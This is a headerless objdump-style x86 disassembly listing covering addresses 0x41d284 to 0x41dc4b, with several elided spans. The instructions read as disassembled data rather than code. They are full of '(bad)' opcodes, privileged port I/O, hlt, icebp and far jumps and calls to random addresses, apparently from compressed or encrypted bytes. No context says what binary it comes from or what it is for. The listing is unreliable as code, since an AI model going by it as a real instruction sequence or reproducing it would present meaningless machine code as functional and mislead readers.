  41d284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d285:	add    BYTE PTR [ebp+esi*2-0x4f123022],bh
  41d28c:	pop    ds
  41d28d:	sub    bh,BYTE PTR [edx+0x6a045379]
  41d293:	mov    ch,0xee
  41d295:	sbb    ebx,esi
  41d297:	and    ch,0x69
  41d29a:	shl    BYTE PTR [ebp-0x529c5096],cl
  41d2a0:	push   esi
  41d2a1:	cmp    al,0xef
  41d2a3:	inc    esp
  41d2a4:	mov    al,0xb4
  41d2a6:	dec    edx
  41d2a7:	in     al,0x80
  41d2a9:	push   edi
  41d2aa:	test   al,0x65
  41d2ac:	hlt    
  41d2ad:	test   DWORD PTR [edi+0x25139916],esp
  41d2b3:	ret    0x5623
  41d2b6:	loopne 0x41d326
  41d2b8:	sbb    ebp,esi
  41d2ba:	aam    0xeb
  41d2bc:	test   eax,0x16803ed5
  41d2c1:	pushf  
  41d2c2:	outs   dx,DWORD PTR ds:[esi]
  41d2c3:	cmp    edi,DWORD PTR [edx+eiz*2+0x3759c854]
  41d2ca:	pop    esi
  41d2cb:	add    BYTE PTR [edi],bl
  41d2cd:	test   DWORD PTR [edx-0x70],eax
  41d2d0:	psllw  mm3,QWORD PTR [eax-0x67]
  41d2d4:	fucom  st(0)
  41d2d6:	icebp  
  41d2d7:	adc    eax,0x816e90
  41d2dc:	and    eax,0x2dfa02fc
  41d2e1:	inc    ecx
  41d2e2:	dec    ecx
  41d2e3:	mov    eax,0xf2003317
  41d2e8:	sbb    DWORD PTR [edx],edi
  41d2ea:	aaa    
  41d2eb:	lods   eax,DWORD PTR ds:[esi]
  41d2ec:	jne    0x41d2db
  41d2ee:	lea    ebp,[ebp+0x74]
  41d2f1:	out    0x34,eax
  41d2f3:	or     eax,0xa5a89626
  41d2f8:	pop    ebx
  41d2f9:	outs   dx,BYTE PTR ds:[esi]
  41d2fa:	xchg   ecx,eax
  41d2fb:	dec    ebx
  41d2fc:	sti    
  41d2fd:	scas   eax,DWORD PTR es:[edi]
  41d2fe:	jge    0x41d33d
  41d300:	push   ebp
  41d301:	mov    eax,0xeae61088
  41d306:	or     BYTE PTR [esi-0x4443451d],ch
  41d30c:	dec    ebp
  41d30d:	and    DWORD PTR [ebp+0x12],0x19
  41d311:	add    al,0xa3
  41d313:	dec    ecx
  41d314:	cld    
  41d315:	mov    ebp,0xc4c94fca
  41d31a:	(bad)  
  41d31b:	sub    al,0xa6
  41d31d:	dec    ecx
  41d31e:	jmp    0x26e6:0x26667a13
  41d325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d326:	rcl    BYTE PTR [esi+0x53],1
  41d329:	cmp    eax,0xbd877f9a
  41d32e:	sub    esi,eax
  41d330:	test   DWORD PTR [ecx-0x8],eax
  41d333:	hlt    
  41d334:	pop    edi
  41d335:	sub    bh,dh
  41d337:	cwde   
  41d338:	fcmove st,st(2)
  41d33a:	imul   esi,ebp,0xffffff94
  41d33d:	retf   
  41d33e:	push   ebp
  41d33f:	arpl   WORD PTR [edi],bp
  41d341:	popa   
  41d342:	jge    0x41d2cb
  41d344:	fiadd  WORD PTR [esi+edi*1-0xa]
  41d348:	push   esi
  41d349:	mov    ebx,0x6a7227e7
  41d34e:	push   0x1
  41d350:	fstp   QWORD PTR [ecx+0x50]
  41d353:	cmp    bl,BYTE PTR [ecx]
  41d355:	sub    DWORD PTR [ebp+0x11d91d2c],edi
  41d35b:	adc    ecx,esp
  41d35d:	xor    BYTE PTR [ebp-0x108b544d],bh
  41d363:	jbe    0x41d317
  41d365:	test   eax,0x50f80afb
  41d36a:	jp     0x41d2ef
  41d36c:	cli    
	...
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx+0x3b],0x1e
  41d3e4:	pop    es
  41d3e5:	rol    DWORD PTR [edx+edi*1],0x1
  41d3e9:	add    bh,bh
  41d3eb:	add    BYTE PTR [eax],al
  41d3ed:	add    BYTE PTR [ecx+0x20f9b782],cl
  41d3f3:	mov    DWORD PTR [ebp-0x40346149],edi
  41d3f9:	pop    esp
  41d3fa:	dec    esp
  41d3fb:	xor    al,0xa7
  41d3fd:	fmulp  st(6),st
  41d3ff:	rol    bl,1
  41d401:	jl     0x41d400
  41d403:	pop    edi
  41d404:	test   al,0x3f
  41d406:	rcl    BYTE PTR [ebp+0x77a2ff24],1
  41d40c:	dec    ebx
  41d40d:	rcl    BYTE PTR [ebx+ebx*2+0x377c5205],1
  41d414:	int    0x93
  41d416:	dec    edi
  41d417:	mov    ebx,0x7fb4b14b
  41d41c:	leave  
  41d41d:	neg    DWORD PTR [ebx-0x33]
  41d420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d421:	mov    dh,0x7b
  41d423:	xlat   BYTE PTR ds:[ebx]
  41d424:	mov    al,ds:0xdfd0e290
  41d429:	jnp    0x41d3ca
  41d42b:	jecxz  0x41d406
  41d42d:	test   al,0x19
  41d42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d430:	(bad)  
  41d431:	lods   eax,DWORD PTR ds:[esi]
  41d432:	or     DWORD PTR [edx+eax*4-0x500f81ee],ebp
  41d439:	jnp    0x41d438
  41d43b:	mov    edi,0xbe423e64
  41d440:	xor    al,0xa1
  41d442:	aas    
  41d443:	cmp    bl,0x3e
  41d446:	shl    ah,cl
  41d448:	pop    ds
  41d449:	out    dx,al
  41d44a:	imul   eax,DWORD PTR [bx+di+0x38f9],0xe
  41d450:	sub    BYTE PTR [eax],cl
  41d452:	sub    BYTE PTR [ecx+0x57],ah
  41d455:	jbe    0x41d42c
  41d457:	outs   dx,DWORD PTR ds:[esi]
  41d458:	dec    edi
  41d459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d45a:	or     dl,ah
  41d45c:	cmp    ah,BYTE PTR [ebx]
  41d45e:	sub    BYTE PTR [eax+0x616b5cca],dl
  41d464:	inc    ebp
  41d465:	sub    cl,BYTE PTR [eax]
  41d467:	push   ss
  41d468:	xor    ebx,DWORD PTR [ebx]
  41d46a:	inc    ecx
  41d46b:	inc    eax
  41d46c:	call   0x291af816
  41d471:	je     0x41d48a
  41d473:	adc    BYTE PTR [esi],bl
  41d475:	or     al,0xd9
  41d477:	retf   0x89ca
  41d47a:	int    0xe9
  41d47c:	push   es
  41d47d:	out    0xd2,al
  41d47f:	add    BYTE PTR [eax],dh
  41d481:	and    bl,BYTE PTR ds:0x390bd885
  41d487:	out    0x6b,eax
  41d489:	sub    al,0x9f
  41d48b:	aad    0xb
  41d48d:	mov    dl,0xbd
  41d48f:	mov    bh,0x48
  41d491:	std    
  41d492:	xor    esi,ebp
  41d494:	icebp  
  41d495:	rol    bl,0xd1
  41d498:	cli    
  41d499:	dec    edi
  41d49a:	or     bl,BYTE PTR [edi]
  41d49c:	fst    DWORD PTR [esi-0x61a2a409]
  41d4a2:	mov    al,0x5c
  41d4a4:	cld    
  41d4a5:	das    
  41d4a6:	out    0x65,eax
  41d4a8:	mov    eax,ds:0x76c78953
  41d4ad:	sbb    BYTE PTR [ecx-0x71],cl
  41d4b0:	and    eax,0xd41f341
  41d4b5:	scas   al,BYTE PTR es:[edi]
  41d4b6:	aaa    
  41d4b7:	cmp    al,0xa7
  41d4b9:	stc    
  41d4ba:	xor    BYTE PTR [ebp+0x48],cl
  41d4bd:	ss sbb al,0x12
  41d4c0:	xor    edx,0x4f
  41d4c3:	rcr    DWORD PTR [ebx-0x20],1
  41d4c6:	out    0xcc,al
  41d4c8:	or     dl,bl
  41d4ca:	enter  0xa561,0xf5
  41d4ce:	xchg   edx,eax
  41d4cf:	add    dh,BYTE PTR [eax]
  41d4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4d2:	gs (bad) 
  41d4d4:	inc    edi
  41d4d5:	dec    eax
  41d4d6:	add    esi,ebp
  41d4d8:	adc    al,0xf
  41d4da:	in     eax,0xf
  41d4dc:	jge    0x41d498
  41d4de:	pop    ss
  41d4df:	xor    dl,cl
  41d4e1:	lock sub al,0x75
  41d4e4:	fcomi  st,st(5)
  41d4e6:	mov    cl,0x66
  41d4e8:	stc    
  41d4e9:	scas   al,BYTE PTR es:[edi]
  41d4ea:	stos   BYTE PTR es:[edi],al
  41d4eb:	adc    BYTE PTR [edi+0x0],cl
	...
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x3f4:0x4171a889
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    bh,bh
  41d56b:	add    BYTE PTR [eax],al
  41d56d:	add    BYTE PTR [ecx+0x33df9d8e],cl
  41d573:	jb     0x41d560
  41d575:	lahf   
  41d576:	test   BYTE PTR [ecx],ch
  41d578:	mov    al,ds:0xac661a51
  41d57d:	shr    DWORD PTR [ebx-0x71],0x20
  41d581:	pop    edx
  41d582:	mov    ecx,0xe490b5ec
  41d587:	daa    
  41d588:	arpl   WORD PTR es:[esi+0x5f],dx
  41d58c:	inc    edi
  41d58d:	xor    al,0xf2
  41d58f:	jo     0x41d53c
  41d591:	xor    DWORD PTR [eax],esp
  41d593:	inc    esp
  41d594:	cdq    
  41d595:	lahf   
  41d596:	sub    ebx,esp
  41d598:	gs sar ah,cl
  41d59b:	fcomp  QWORD PTR [edi-0x5c2f398c]
  41d5a1:	daa    
  41d5a2:	jnp    0x41d560
  41d5a4:	inc    edi
  41d5a5:	neg    ecx
  41d5a7:	fld    TBYTE PTR [ebp-0x19]
  41d5aa:	lock sbb al,0xe5
  41d5ad:	addr16 and eax,0x32a3e457
  41d5b3:	pop    eax
  41d5b4:	(bad)  
  41d5b5:	sbb    BYTE PTR [ebx],bl
  41d5b7:	ret    
  41d5b8:	mov    BYTE PTR [esi+0x8],bl
  41d5bb:	mov    cl,0xe6
  41d5bd:	mov    ds:0xb9feef96,eax
  41d5c2:	sbb    al,0x6
  41d5c4:	mov    dh,BYTE PTR [ebx-0x69ab0b23]
  41d5ca:	adc    cl,dh
  41d5cc:	xchg   ecx,eax
  41d5cd:	mov    ah,BYTE PTR [ebp+0x7]
  41d5d0:	iret   
  41d5d1:	std    
  41d5d2:	mov    ah,0xc4
  41d5d4:	mov    ah,0x92
  41d5d6:	out    dx,al
  41d5d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5d8:	push   ss
  41d5d9:	add    al,0x9f
  41d5db:	test   al,0xc2
  41d5dd:	jnp    0x41d5c1
  41d5df:	xchg   edx,eax
  41d5e0:	push   ss
  41d5e1:	pop    edx
  41d5e2:	mov    bh,0x42
  41d5e4:	fdiv   QWORD PTR [ebp+0x57b41747]
  41d5ea:	lds    edi,FWORD PTR [ebx-0x36]
  41d5ed:	sub    BYTE PTR [edx],al
  41d5ef:	gs in  eax,dx
  41d5f1:	fstp   QWORD PTR [edi-0x2bf60d43]
  41d5f7:	mov    ebx,DWORD PTR [esi+0x57]
  41d5fa:	push   esi
  41d5fb:	into   
  41d5fc:	into   
  41d5fd:	push   es
  41d5fe:	and    al,0xea
  41d600:	push   edi
  41d601:	add    ebp,esi
  41d603:	cdq    
  41d604:	or     DWORD PTR [edx-0x5e53310],eax
  41d60a:	popa   
  41d60b:	dec    edi
  41d60c:	adc    esi,DWORD PTR [esi-0x80]
  41d60f:	popa   
  41d610:	hlt    
  41d611:	sahf   
  41d612:	test   BYTE PTR [esi-0x5d8a5942],0x53
  41d619:	std    
  41d61a:	mov    ch,0xf
  41d61c:	push   ds
  41d61d:	daa    
  41d61e:	paddsw mm0,QWORD PTR [eax]
  41d621:	mov    esp,0x240f3c12
  41d626:	cmp    DWORD PTR ds:0x78aa5f87,0x97c1b414
  41d630:	push   ss
  41d631:	frstor [esi+0x1a23eda2]
  41d637:	and    dh,BYTE PTR [edi]
  41d639:	jns    0x41d5d1
  41d63b:	mov    edi,0xa3a42275
  41d640:	bound  ebp,QWORD PTR [edx+eiz*8+0x3f76a4bf]
  41d647:	push   0x17111e05
  41d64c:	int    0x97
  41d64e:	xor    ecx,DWORD PTR [ecx-0x72]
  41d651:	adc    eax,0x90c35bee
  41d656:	jp     0x41d62c
  41d658:	pop    ecx
  41d659:	sahf   
  41d65a:	xor    BYTE PTR ds:0xa74eee00,bh
  41d660:	sub    eax,0xb5be090c
  41d665:	sub    cl,BYTE PTR [ebp*8-0x1c08115b]
  41d66c:	and    DWORD PTR [eax],eax
	...
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x7966e435
  41d6e3:	out    0xcb,eax
  41d6e5:	out    dx,eax
  41d6e6:	add    bh,BYTE PTR [ecx+eax*1]
  41d6e9:	add    bh,bh
  41d6eb:	add    BYTE PTR [eax],al
  41d6ed:	add    ch,al
  41d6ef:	sub    eax,0xbabd62a7
  41d6f4:	in     eax,0xc5
  41d6f6:	shl    ebx,1
  41d6f8:	xor    DWORD PTR [esi],0x4ee47749
  41d6fe:	sti    
  41d6ff:	clc    
  41d700:	sub    BYTE PTR [ebx+0x161a3468],0x4f
  41d707:	data16 jae 0x41d73a
  41d70a:	mov    dh,0x50
  41d70c:	sbb    al,0xf0
  41d70e:	lahf   
  41d70f:	xor    BYTE PTR [ecx-0x9],ah
  41d712:	loop   0x41d756
  41d714:	ret    0x5597
  41d717:	popf   
  41d718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d719:	cmp    al,BYTE PTR [ebx]
  41d71b:	jle    0x41d6a1
  41d71d:	xchg   edi,eax
  41d71e:	push   DWORD PTR [edx]
  41d720:	in     al,dx
  41d721:	add    eax,0xc4685a75
  41d726:	sbb    edi,DWORD PTR [edx]
  41d728:	lahf   
  41d729:	ins    DWORD PTR es:[edi],dx
  41d72a:	mov    ds:0xa87926be,al
  41d72f:	ret    0x9865
  41d732:	jge    0x41d6d0
  41d734:	sub    al,0xdd
  41d736:	into   
  41d737:	nop
  41d738:	lods   al,BYTE PTR fs:[esi]
  41d73a:	mov    bh,0x51
  41d73c:	dec    esi
  41d73d:	aam    0xcf
  41d73f:	daa    
  41d740:	cmp    al,0xd8
  41d742:	repz ja 0x41d712
  41d745:	in     al,dx
  41d746:	or     ecx,esp
  41d748:	test   eax,0xbffeebb7
  41d74d:	jno    0x41d71d
  41d74f:	aad    0x65
  41d751:	iret   
  41d752:	mov    ebx,0x989014fe
  41d757:	je     0x41d7a3
  41d759:	inc    ecx
  41d75a:	ja     0x41d73c
  41d75c:	fldcw  WORD PTR [edi]
  41d75e:	fwait
  41d75f:	popa   
  41d760:	xchg   ebp,eax
  41d761:	test   eax,0x3dccb649
  41d766:	push   ebx
  41d767:	in     al,dx
  41d768:	pop    ebp
  41d769:	das    
  41d76a:	fsub   DWORD PTR [ebp-0xb]
  41d76d:	jno    0x41d75b
  41d76f:	cmp    al,cl
  41d771:	fild   QWORD PTR [edi-0x4b]
  41d774:	pop    ds
  41d775:	mov    ebx,0x223dd52
  41d77a:	and    ch,BYTE PTR [edi-0x3e]
  41d77d:	adc    al,0x13
  41d77f:	ds xchg esi,eax
  41d781:	push   0x5a
  41d783:	inc    ecx
  41d784:	mov    edx,0xc9ed37e2
  41d789:	(bad)  
  41d78a:	xchg   ebx,eax
  41d78b:	mov    ecx,0x8ba74035
  41d790:	loope  0x41d7ab
  41d792:	out    0xad,eax
  41d794:	lods   eax,DWORD PTR ds:[esi]
  41d795:	addr16 dec edx
  41d797:	jae    0x41d778
  41d799:	cli    
  41d79a:	mov    bh,0x4
  41d79c:	adc    DWORD PTR [edi+0x3a0885c3],ecx
  41d7a2:	add    DWORD PTR [eax],esi
  41d7a4:	pop    ebx
  41d7a5:	mov    esi,0xe9889418
  41d7aa:	xchg   ebx,eax
  41d7ab:	sbb    BYTE PTR [ebx],ch
  41d7ad:	dec    edx
  41d7ae:	mov    edx,0xa6b9be73
  41d7b3:	push   esp
  41d7b4:	mov    edx,0xf3ada73b
  41d7b9:	dec    eax
  41d7ba:	or     eax,ecx
  41d7bc:	fwait
  41d7bd:	mov    dh,0x8e
  41d7bf:	sahf   
  41d7c0:	aaa    
  41d7c1:	xlat   BYTE PTR ds:[ebx]
  41d7c2:	cmp    BYTE PTR [ebp+0x2a522761],al
  41d7c8:	add    eax,DWORD PTR [edi+0x58]
  41d7cb:	push   ss
  41d7cc:	pop    ds
  41d7cd:	fiadd  WORD PTR [edx+0x54d543e0]
  41d7d3:	call   0x28c831db
  41d7d8:	xchg   ebx,eax
  41d7d9:	sub    bl,BYTE PTR [esi+eiz*1+0x1]
  41d7dd:	int    0x7e
  41d7df:	lods   al,BYTE PTR ds:[esi]
  41d7e0:	dec    DWORD PTR [ebx+0x1b]
  41d7e3:	pop    ebx
  41d7e4:	loopne 0x41d7d8
  41d7e6:	cmp    DWORD PTR [edx+0x30f09565],0x38
	...
  41d855:	add    BYTE PTR [esi+ecx*8],ah
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	xchg   esi,eax
  41d863:	inc    ebx
  41d864:	xor    DWORD PTR [ebx+0x13d01],eax
  41d86a:	inc    DWORD PTR [eax]
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	sbb    eax,0xbc477c40
  41d873:	inc    esp
  41d874:	mov    cl,0x26
  41d876:	mov    BYTE PTR [esi],bh
  41d878:	inc    eax
  41d879:	pop    ecx
  41d87a:	mov    ebp,0xadf674ef
  41d87f:	fnsave [esi]
  41d881:	cmc    
  41d882:	cmp    al,BYTE PTR [edi+0x7d]
  41d885:	jmp    0x41d8be
  41d887:	and    eax,0x3f8993ac
  41d88c:	or     eax,0x70932415
  41d891:	das    
  41d892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d893:	call   0x5637:0xf7cd87fb
  41d89a:	(bad)  
  41d89b:	jle    0x41d89f
  41d89d:	pop    eax
  41d89e:	jae    0x41d91b
  41d8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8a1:	out    dx,eax
  41d8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8a3:	iret   
  41d8a4:	mov    ebx,0x5fa144c4
  41d8a9:	mov    ds:0x8a70c9aa,al
  41d8ae:	sar    bh,0x8d
  41d8b1:	sub    ah,BYTE PTR [edi+0xdc3a134]
  41d8b7:	jno    0x41d8ad
  41d8b9:	je     0x41d85c
  41d8bb:	cdq    
  41d8bc:	cmp    BYTE PTR ds:0x57e06343,bl
  41d8c2:	or     eax,esi
  41d8c4:	sahf   
  41d8c5:	sub    al,0xf5
  41d8c7:	cmp    dh,bh
  41d8c9:	add    ecx,DWORD PTR [ebx+edi*8+0x6c482cf9]
  41d8d0:	or     ax,0xafd1
  41d8d4:	fs ret 
  41d8d6:	fsub   st(6),st
  41d8d8:	mov    edx,0x5e172915
  41d8dd:	call   0x7f43:0xe1c538a9
  41d8e4:	or     esp,DWORD PTR [ebx+edi*4+0x1bfa4be3]
  41d8eb:	inc    eax
  41d8ec:	cmp    DWORD PTR [esi],0xb6292176
  41d8f2:	cmp    DWORD PTR [edi+edi*2-0x1d210bba],eax
  41d8f9:	mov    ah,0x79
  41d8fb:	mul    DWORD PTR [ecx+esi*8+0x3a90c899]
  41d902:	ja     0x41d981
  41d904:	mov    dh,0xc3
  41d906:	les    esp,FWORD PTR [edx]
  41d908:	and    eax,0x64b59ca1
  41d90d:	repnz ins BYTE PTR es:[edi],dx
  41d90f:	fwait
  41d910:	iret   
  41d911:	sbb    eax,DWORD PTR [ebp-0x5742a736]
  41d917:	add    bh,ah
  41d919:	cs push ebp
  41d91b:	dec    ebx
  41d91c:	dec    esp
  41d91d:	mov    dh,0xaa
  41d91f:	add    BYTE PTR [ecx+0x3a0b72e2],0xfd
  41d926:	mov    al,0x9d
  41d928:	in     al,dx
  41d929:	inc    ebp
  41d92a:	mov    cl,0x6
  41d92c:	int3   
  41d92d:	xor    esp,DWORD PTR [edx]
  41d92f:	arpl   dx,cx
  41d931:	jp     0x41d917
  41d933:	aam    0x74
  41d935:	iret   
  41d936:	sahf   
  41d937:	imul   esi,DWORD PTR [esi-0x69b3e1f0],0xab5250a2
  41d941:	ror    BYTE PTR [edx],0x94
  41d944:	or     ecx,DWORD PTR [ebp+ebx*8+0x8d0c875]
  41d94b:	lods   al,BYTE PTR ds:[esi]
  41d94c:	inc    edi
  41d94d:	jg     0x41d9bd
  41d94f:	jnp    0x41d92d
  41d951:	cmp    ebp,ebp
  41d953:	mov    edx,0xdbf24fd3
  41d958:	and    ah,BYTE PTR [eiz*1-0x13c034ed]
  41d95f:	adc    eax,0xcb25861d
  41d964:	sub    ah,bh
  41d966:	mov    ds:0x2c23253d,eax
  41d96b:	outs   dx,BYTE PTR ds:[esi]
  41d96c:	out    0x0,al
	...
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	sar    DWORD PTR gs:[eax-0x3c],1
  41d9e5:	and    eax,DWORD PTR [eax]
  41d9e7:	add    DWORD PTR ds:[eax],eax
  41d9ea:	inc    DWORD PTR [eax]
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	pop    ebp
  41d9ef:	cwde   
  41d9f0:	outs   dx,BYTE PTR ds:[esi]
  41d9f1:	fild   WORD PTR [ecx+edx*8]
  41d9f4:	out    0x3c,eax
  41d9f6:	push   esp
  41d9f7:	cli    
  41d9f8:	stc    
  41d9f9:	ss jo  0x41da26
  41d9fc:	not    BYTE PTR [esi]
  41d9fe:	sbb    al,0x62
  41da00:	in     al,dx
  41da01:	test   DWORD PTR [edx+0x3b],0x410c4513
  41da08:	jmp    0x5ccb:0x21cd63ed
  41da0f:	in     eax,dx
  41da10:	loope  0x41d9a4
  41da12:	popa   
  41da13:	aam    0x43
  41da15:	mov    esp,0xf73b3185
  41da1a:	fld    TBYTE PTR [ebp-0x4bd20b2f]
  41da20:	fs nop
  41da22:	jmp    0x62e9d1ca
  41da27:	hlt    
  41da28:	xor    eax,0x3d2a10e7
  41da2d:	sahf   
  41da2e:	pop    edi
  41da2f:	xchg   esp,eax
  41da30:	sub    ecx,edi
  41da32:	cli    
  41da33:	pop    es
  41da34:	inc    edx
  41da35:	out    dx,al
  41da36:	fs out dx,eax
  41da38:	stc    
  41da39:	dec    esi
  41da3a:	es ss push 0x42c2ce89
  41da41:	in     al,0x39
  41da43:	add    eax,0x45e1058d
  41da48:	in     eax,dx
  41da49:	ret    0x538c
  41da4c:	inc    eax
  41da4d:	lock sub BYTE PTR ds:0x342285cb,ch
  41da54:	js     0x41dac7
  41da56:	fwait
  41da57:	pop    ecx
  41da58:	daa    
  41da59:	dec    edi
  41da5a:	push   ebp
  41da5b:	cmp    BYTE PTR [ecx+eax*2],0xb6
  41da5f:	push   ds
  41da60:	(bad)  
  41da61:	loopne 0x41d9e4
  41da63:	mov    eax,ds:0x14312fda
  41da68:	add    ebp,ebx
  41da6a:	pop    ebx
  41da6b:	inc    ebx
  41da6c:	repnz repnz pop ebp
  41da6f:	or     edx,edi
  41da71:	mov    eax,ds:0x741a76a7
  41da76:	cmc    
  41da77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da78:	adc    cl,bh
  41da7a:	pop    esp
  41da7b:	xor    BYTE PTR [eax-0x3d],cl
  41da7e:	add    BYTE PTR [edx],ch
  41da80:	scas   eax,DWORD PTR es:[edi]
  41da81:	cmp    eax,0x8f23775e
  41da86:	call   0xd07d8978
  41da8b:	adc    ebp,DWORD PTR [edx]
  41da8d:	add    al,0xfd
  41da8f:	(bad)  
  41da90:	push   eax
  41da91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da92:	adc    edx,esi
  41da94:	out    0x8e,al
  41da96:	add    dl,BYTE PTR [edi+0x3b]
  41da99:	mov    eax,0x59eb8a7
  41da9e:	mov    eax,0xe096550d
  41daa3:	dec    ebp
  41daa4:	outs   dx,BYTE PTR ds:[esi]
  41daa5:	adc    ah,ah
  41daa7:	iret   
  41daa8:	fst    DWORD PTR [esi+eiz*2+0x5a9c55db]
  41daaf:	out    dx,al
  41dab0:	jg     0x41da90
  41dab2:	mov    dl,0xf7
  41dab4:	pop    ebx
  41dab5:	dec    ebp
  41dab6:	add    esp,DWORD PTR [ebp+0xf83dc51]
  41dabc:	out    dx,eax
  41dabd:	sub    al,0x79
  41dabf:	inc    ebp
  41dac0:	pop    ss
  41dac1:	lods   eax,DWORD PTR ds:[esi]
  41dac2:	jbe    0x41daca
  41dac4:	jnp    0x41da69
  41dac6:	loopne 0x41db01
  41dac8:	and    al,0x82
  41daca:	adc    dl,BYTE PTR [ebx+0x39]
  41dacd:	mov    ebx,0x961d8a64
  41dad2:	popf   
  41dad3:	and    DWORD PTR [esi],ecx
  41dad5:	push   0xfffffff7
  41dad7:	jne    0x41da6e
  41dad9:	mov    ebx,0x7385bc94
  41dade:	stos   BYTE PTR es:[edi],al
  41dadf:	and    dl,BYTE PTR [ebp+esi*4-0x65]
  41dae3:	pop    esp
  41dae4:	cld    
  41dae5:	loope  0x41dab0
  41dae7:	xor    al,0xbd
  41dae9:	in     al,0xb
  41daeb:	(bad)  
  41daec:	push   ss
	...
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffffd4
  41db63:	pop    edx
  41db64:	sub    al,0x6f
  41db66:	(bad)  
  41db67:	add    DWORD PTR ds:[eax],eax
  41db6a:	inc    DWORD PTR [eax]
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	je     0x41dbd2
  41db70:	icebp  
  41db71:	in     eax,0x77
  41db73:	dec    BYTE PTR [eax*2-0x798a7cdd]
  41db7a:	pop    edi
  41db7b:	pop    ds
  41db7c:	cmp    ebx,DWORD PTR [ecx-0x14eaf5cb]
  41db82:	adc    eax,0xed38dd1
  41db87:	add    BYTE PTR ss:[edi],ah
  41db8a:	fsubr  QWORD PTR [edi-0x261c0f9b]
  41db90:	test   eax,0xb3325ea3
  41db95:	xchg   ecx,eax
  41db96:	stos   BYTE PTR es:[edi],al
  41db97:	sub    BYTE PTR [ecx],al
  41db99:	push   edx
  41db9a:	lahf   
  41db9b:	jns    0x41dba8
  41db9d:	imul   BYTE PTR [ebx-0x2edf940d]
  41dba3:	test   BYTE PTR [esi],cl
  41dba5:	add    ch,BYTE PTR [ebx]
  41dba7:	and    al,0xdb
  41dba9:	adc    eax,0x3c0c379
  41dbae:	xchg   ebp,eax
  41dbaf:	pop    esi
  41dbb0:	leave  
  41dbb1:	or     al,0x39
  41dbb3:	mov    ah,0xc5
  41dbb5:	cwde   
  41dbb6:	ja     0x41dba3
  41dbb8:	pop    edi
  41dbb9:	pusha  
  41dbba:	xchg   ebx,eax
  41dbbb:	pop    ebp
  41dbbc:	clc    
  41dbbd:	(bad)  ss:[edx+0x7a4438a]
  41dbc4:	inc    edi
  41dbc5:	das    
  41dbc6:	cdq    
  41dbc7:	jmp    0x4ed1:0x22fdc476
  41dbce:	stc    
  41dbcf:	and    edi,edx
  41dbd1:	or     DWORD PTR [eax],ebp
  41dbd3:	and    DWORD PTR [edx-0x42f45201],ebp
  41dbd9:	in     al,dx
  41dbda:	push   esi
  41dbdb:	cmp    al,0x5
  41dbdd:	loopne 0x41dc38
  41dbdf:	mov    bh,0x6
  41dbe1:	rcr    DWORD PTR [edx+0x2b1bae6d],1
  41dbe7:	push   esp
  41dbe8:	push   ds
  41dbe9:	or     DWORD PTR [esi],ebx
  41dbeb:	jmp    FWORD PTR [edx*8+0x7bd6354b]
  41dbf2:	mov    DWORD PTR [edx-0x2],esi
  41dbf5:	cmp    BYTE PTR [esi+ebx*4-0x60],al
  41dbf9:	fwait
  41dbfa:	sbb    eax,0x513ea605
  41dbff:	cmp    esi,DWORD PTR [edx+0x2cb34d8d]
  41dc05:	pop    ds
  41dc06:	add    bl,BYTE PTR [ebx]
  41dc08:	push   esp
  41dc09:	fdivr  DWORD PTR [ecx]
  41dc0b:	fidivr WORD PTR [eax-0x1c]
  41dc0e:	ret    
  41dc0f:	jl     0x41dc03
  41dc11:	push   eax
  41dc12:	ins    BYTE PTR es:[edi],dx
  41dc13:	fbld   TBYTE PTR [esi]
  41dc15:	popf   
  41dc16:	fidivr DWORD PTR [edi]
  41dc18:	xchg   esp,eax
  41dc19:	jb     0x41dbc2
  41dc1b:	out    dx,eax
  41dc1c:	fisttp QWORD PTR [ebp+ebx*2-0x76]
  41dc20:	cs mov dh,0x5b
  41dc23:	test   DWORD PTR [edx-0x3b],esi
  41dc26:	pop    es
  41dc27:	add    DWORD PTR [ecx-0x3be506e0],ebp
  41dc2d:	xchg   edx,eax
  41dc2e:	or     eax,0xfac14d06
  41dc33:	mov    dl,0x49
  41dc35:	into   
  41dc36:	sbb    cl,bl
  41dc38:	fstenv [esi-0x7bcbcfe7]
  41dc3f:	call   0x155f:0x99078c71
  41dc46:	xor    ah,0xe9
  41dc49:	dec    ebp
  41dc4a:	dec    ebx
  41dc4b:	call   0x115eeb64
